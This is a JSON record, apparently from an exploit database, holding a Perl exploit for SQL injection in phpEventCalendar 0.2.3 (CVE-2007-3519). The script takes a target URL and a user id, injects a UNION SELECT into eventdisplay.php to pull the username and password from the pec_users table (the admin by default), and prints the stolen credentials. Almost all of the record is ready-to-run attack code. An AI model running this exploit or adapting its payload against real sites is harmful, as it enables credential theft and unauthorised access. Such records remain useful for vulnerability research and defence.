{
  "id": "4135",
  "title": "phpEventCalendar 0.2.3 - &#039;eventdisplay.php&#039; SQL Injection",
  "cve": "CVE-2007-3519",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n#\tVendor url: www.ikemcg.com\r\n#\r\nrequire LWP::UserAgent;\r\n\r\nprint \"#\r\n# phpEventCalendar <= v0.2.3 SQL Injection Exploit\r\n# By Iron - ironwarez.info\r\n# Thanks to Silentz for the help :)\r\n# Greets to everyone at RootShell Security Group & dHack\r\n#\r\n# Example target url: http://www.target.com/phpeventcalendar/\r\nTarget url?\";\r\nchomp($target=<stdin>);\r\nif($target !~ /^http:\\/\\//)\r\n{\r\n\t$target = \"http://\".$target;\r\n}\r\nif($target !~ /\\/$/)\r\n{\r\n\t$target .= \"/\";\r\n}\r\nprint \"User id to retrieve name/password from? (1 = admin)\";\r\nchomp($target_id=<stdin>);\r\n$target .= \"eventdisplay.php?id=-999%20UNION%20SELECT%20username,password,password%20FROM%20pec_users%20WHERE%20uid=\".$target_id;\r\n\r\n$ua = LWP::UserAgent->new;\r\n$ua->timeout(10);\r\n$ua->env_proxy;\r\n\r\n$response = $ua->get($target);\r\n\r\nif ($response->is_success)\r\n{\r\n\tif($response->content =~ /<span class=\"display_header\">(.*)<\\/span>/i)\r\n\t{\r\n\t\t($username,$password) = split(/,/,$1);\r\n\t\tprint \"Username: \".$username;\r\n\t\tprint \"\\nPassword: \".$password;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint \"\\nUnable to retrieve username/password.\";\r\n\t}\r\n}\r\nelse\r\n{\r\n die \"Error: \".$response->status_line;\r\n}\r\n\r\n# milw0rm.com [2007-07-01]",
  "url": "https://www.exploit-db.com/exploits/4135"
}